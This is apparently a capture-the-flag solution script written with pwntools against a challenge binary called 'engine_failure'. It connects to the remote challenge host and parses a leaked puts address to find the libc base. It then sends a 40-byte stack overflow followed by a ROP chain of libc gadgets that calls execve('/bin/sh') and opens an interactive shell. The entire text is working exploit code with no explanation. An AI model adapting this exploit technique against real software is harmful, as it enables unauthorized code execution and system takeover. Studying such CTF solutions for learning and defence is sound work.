from pwn import *


p=remote("spaceheroes-engine-failure.chals.io",443,ssl=True,sni="spaceheroes-engine-failure.chals.io")

# p = process('./engine_failure.bin', env={"LD_PRELOAD":"./libc.so.6"})
# gdb.attach(p, gdbscript='b vuln')

elf = ELF('./engine_failure.bin')
libc = ELF('./libc.so.6')

rop_elf = ROP(elf)
rop_libc = ROP(libc)

print(p.recv().decode(errors="ignore"))
print(p.recv().decode(errors="ignore")) # only on remote
p.sendline(b'2')

resp = p.recv()
offset = resp.find(b'Coordinates: ') + len('Coordinates: ')
leaked_puts_addr = int(resp[offset:offset+len('0xxxxxxxxxxxxx')], 16)
print(f"LEAKED PUTS ADDRESS: {hex(leaked_puts_addr)}")

libc_leaked_addr = leaked_puts_addr - libc.sym['puts']
print(f"LEAKED LIBC ADDRESS: {hex(libc_leaked_addr)}")

pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret']).address + libc_leaked_addr
pop_rsi = rop_libc.find_gadget(['pop rsi', 'ret']).address + libc_leaked_addr
pop_rdx = rop_libc.find_gadget(['pop rdx']).address + libc_leaked_addr
pop_rax = rop_libc.find_gadget(['pop rax', 'ret']).address + libc_leaked_addr
syscall_addr = rop_libc.find_gadget(['syscall', 'ret']).address + libc_leaked_addr
bin_sh = next(libc.search(b'/bin/sh')) + libc_leaked_addr

payload = b'A' * 40
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(0) # r12
payload += p64(syscall_addr)

p.sendline(b'1')
print(p.recv().decode(errors="ignore"))
p.sendline(b'1')
print(p.recv().decode(errors="ignore"))
p.sendline(payload)

p.interactive()
